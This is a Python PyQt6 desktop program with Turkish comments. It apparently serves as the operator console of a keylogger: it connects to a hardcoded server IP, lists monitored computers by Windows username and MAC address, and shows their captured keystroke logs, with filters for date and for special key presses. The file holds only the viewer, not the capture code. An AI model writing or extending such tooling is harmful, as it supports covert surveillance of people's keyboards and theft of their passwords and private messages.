from PyQt6.QtCore import QDate, QDateTime, Qt
from PyQt6.QtWidgets import *

import socket
import json
import math, time
import os

selectedText = "Lütfen bir bilgisayar seçiniz!"
mainData = {}

#
host = "193.164.7.25"
port = 4000

class WidgetGallery(QDialog):
    #Arayüzümüzün başlangıç işlemleri
    def __init__(self, parent=None):
        super(WidgetGallery, self).__init__(parent)

        self.shownMacAddress = ""

        self.originalPalette = QApplication.palette()
        self.setFixedWidth(1000)
        self.setFixedHeight(800)

        self.filterRecordKeysCheckBox = QCheckBox("&Keyword pressleri göster")
        self.filterRecordKeysCheckBox.setChecked(True)

        self.filterStartDate = QDateEdit(calendarPopup=True)
        self.filterStartDate.setDateTime(QDateTime.currentDateTime())
        self.filterStartDate.setFixedWidth(250)

        self.filterFinishDate = QDateEdit(calendarPopup=True)
        self.filterFinishDate.setDateTime(QDateTime.currentDateTime())
        self.filterFinishDate.setFixedWidth(250)

        self.createTopLeftGroupBox()
        self.createTopRightGroupBox()

        self.filterRecordKeysCheckBox.toggled.connect(self.filterHotKeys)
        self.filterStartDate.editingFinished.connect(self.filderDateTime)
        self.filterFinishDate.editingFinished.connect(self.filderDateTime)

        mainLayout = QGridLayout()
        mainLayout.addWidget(self.topLeftGroupBox, 1, 0)
        mainLayout.addWidget(self.topRightGroupBox, 1, 1)
        mainLayout.setRowStretch(1, 1)
        mainLayout.setColumnStretch(0, 1)
        mainLayout.setColumnStretch(1, 1)


        self.setLayout(mainLayout)
        self.setWindowTitle("Styles")
        self.changeStyle('Fusion')

    #Arayüzümüzü default olarak Fusion tipinde başlatıyoruz
    def changeStyle(self, styleName):
        QApplication.setStyle(QStyleFactory.create(styleName))

    def createTopLeftGroupBox(self):
        self.topLeftGroupBox = QGroupBox("Aktif bilgisayar listesi")

        #Sunucudan gelen bilgiyi işliyoruz
        if mainData:
            if mainData["type"] == "ApplicationConnected":
                tableWidget = QTableWidget(len(mainData["data"]), 4)

                tableWidget.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
                tableWidget.setHorizontalHeaderLabels(["Bilgisayar ismi", "MAC Adresi", "Son görülme", "Bilgi getir"])
                a = 0
                #Her bir bilgisayar için satır oluşturuyoruz
                for x in mainData["data"]:
                    rowData = mainData["data"][x]
                    tableWidget.setItem(a, 0, QTableWidgetItem(rowData["WinUsername"]))
                    tableWidget.setItem(a, 1, QTableWidgetItem(x))
                    UT = int(GetUnixMinutes())
                    #Son bağlantı unixtime'ye göre dakika olarak aldığımız için tam tarihe çeviriyoruz. 1 saat 15 dakika cinsinden.
                    T = "Az önce"
                    if(UT != rowData["LastSeen"]):
                        T = CalcDateFromMinutes(UT - rowData["LastSeen"]) + " önce"
                    tableWidget.setItem(a, 2, QTableWidgetItem(T))
                    btn = QPushButton(tableWidget)
                    #Bilgi getir butonumuzu hazırlıyoruz basıldığında MAC adresi iletiyoruz
                    btn.clicked.connect(self.buttonClicked(x))
                    btn.setText('Bilgi getir')
                    tableWidget.setCellWidget(a, 3, btn)
                    a += 1

                tableWidget.horizontalHeader().setStretchLastSection(True)

                tab1hbox = QHBoxLayout()
                tab1hbox.setContentsMargins(5, 5, 5, 5)
                tab1hbox.addWidget(tableWidget)


                checkBox = QCheckBox("Tri-state check box")
                checkBox.setTristate(True)
                checkBox.setCheckState(Qt.CheckState.PartiallyChecked)

                layout = QVBoxLayout()
                layout.addStretch(1)
                self.topLeftGroupBox.setLayout(tab1hbox)

    #Bilgisayar kayıtlarında KEY'lerin görülmesini filtreleyecek fonksiyon.
    def filterHotKeys(self):
        if self.shownMacAddress != "":
            self.InsertMessagesToApp(self.shownMacAddress)

    #Bilgisayar kayıtlarını tarihe göre filtreleyecek fonksiyon.
    def filderDateTime(self):
        if self.shownMacAddress != "":
            self.InsertMessagesToApp(self.shownMacAddress)

    def buttonClicked(self, pcMac):
        def buttonClickedVariable():
            print("Button clicked, requesting messages from the server...")
            SocketGetMessages(pcMac)
            print("Request successfully, messages going to insert")
            self.InsertMessagesToApp(pcMac)
        return buttonClickedVariable

    #Gelen kayıtları uygulamaya yazdırma işlemi
    def InsertMessagesToApp(self, pcMac):
        global mainData
        #Filtreleme verilerini çekiyoruz
        rk = self.filterRecordKeysCheckBox.isChecked()
        st = self.filterStartDate.date()
        ft = self.filterFinishDate.date()
        totalText = ""
        textArray = []
        lastDate = ""
        for x in mainData["data"][pcMac]["Messages"]:
            t = mainData["data"][pcMac]["Messages"][x]
            #Her bir satırı işlemek için parçalıyoruz
            ts = t.split("\n")
            for h in ts:
                #Satırın başında tarih var mı kontrol ediyoruz
                if h[:1] == "[":
                    hs = h.split("]")
                    #Kalan kısmı tam tarihi almak için parçalıyoruz
                    hd = hs[0][1:]
                    if lastDate == "":
                        lastDate = hd
                    #Tarih yani saniye değişmediyse aynı satıra yapıştırmak için kontrol yapıyoruz
                    if hd != lastDate:
                        db = lastDate.split(" ")
                        dbt = db[0].split("-")
                        qdb = QDate(int(dbt[0]), int(dbt[1]), int(dbt[2]))
                        #Tarihimiz filtrelere uyuyor ise ekliyoruz, uyuşmuyorsa pas geçiyoruz.
                        if qdb >= st and qdb <= ft:
                            totalText += "\n[{0}] {1}".format(lastDate, "".join(textArray))
                        lastDate = ""
                        textArray = []
                    for n in hs[1:]:
                        if rk == False and n[1:2] == "(":
                            continue
                        if rk == False and n[1:2] == "<":
                            continue
                        if rk == False and n[1:2] == ("\ x").replace(" ", ""):
                            continue
                        textArray.append(n[1:])
                else:
                    totalText += "\n" + h
        self.pcRecords.setPlainText(totalText)
        self.shownMacAddress = pcMac

    def createTopRightGroupBox(self):
        global selectedText
        self.topRightGroupBox = QGroupBox("Bilgisayar kayıtları")

        tab2 = QWidget()
        textEdit = QTextEdit()

        textEdit.setPlainText(selectedText)
        print(selectedText)
        textEdit.setReadOnly(True)
        textEdit.setFixedHeight(625)
        tab2hbox = QHBoxLayout()
        tab2hbox.setContentsMargins(5, 5, 5, 5)
        tab2hbox.addWidget(textEdit)
        tab2.setLayout(tab2hbox)
        self.pcRecords = textEdit

        policy = tab2.sizePolicy().horizontalPolicy()
        tab2.setSizePolicy(policy, policy)

        layout = QVBoxLayout()
        layout.addWidget(self.filterRecordKeysCheckBox)
        layout.addWidget(self.filterStartDate)
        layout.addWidget(self.filterFinishDate)
        layout.addWidget(tab2)
        layout.addStretch(1)
        self.topRightGroupBox.setLayout(layout)

#Uygulama ilk başlatıldığında bilgisayar listesini almak için bağlantı kuruyoruz
def SocketDefaultConnect():
    global mainData, host, port
    print("Tryin to connection...")
    try:
        client_socket = socket.socket()  # instantiate
        client_socket.connect((host, port))  # connect to the server

        message = {
            "type": "ApplicationConnected",
            "data": {}
        }
        client_socket.send(json.dumps(message).encode())

        data = client_socket.recv(1024 * 1024).decode()
        mainData = json.loads(data)
        print("MainData Loaded Successfully!")
        client_socket.close()
    except:
        print("Server didn't respond.")

#Mesaj isteği olduğunda sunucuya istek yolluyoruz
def SocketGetMessages(MacID):
    global mainData, host, port
    try:
        print("Messages getting...")
        client_socket = socket.socket()  # instantiate
        client_socket.connect((host, port))  # connect to the server

        message = {
            "type": "GetMessagesFromMac",
            "data": {
                "MacID": MacID
            }
        }
        client_socket.send(json.dumps(message).encode())
        data = client_socket.recv(1024 * 1024).decode()
        data = json.loads(data)
        #Geri bilgi geldiğinde MAC adresine göre kayıt ediyoruz
        if data["type"] == "GetMessagesFromMac":
            mainData["data"][MacID]["Messages"] = data["data"]
        client_socket.close()
    except:
        print("Server didn't respond for GetMessagesFromMac.")

def GetUnixMinutes():
    return str(math.floor(int(time.time()) / 60))

#Aldığımız dakika farkından gün, saat ve dakika cinsinden tarih üretiyoruz
def CalcDateFromMinutes(a):
    g = math.floor(a / 1440)
    s = math.floor((a % 1440) / 60)
    d = a % 60
    rT = ""
    if g > 0: rT += str(g) + " gün, "
    if s > 0: rT += str(s) + " saat, "
    rT += str(d) + " dakika"
    return rT

if __name__ == '__main__':
    import sys

    SocketDefaultConnect()

    app = QApplication(sys.argv)
    gallery = WidgetGallery()
    gallery.show()
    sys.exit(app.exec())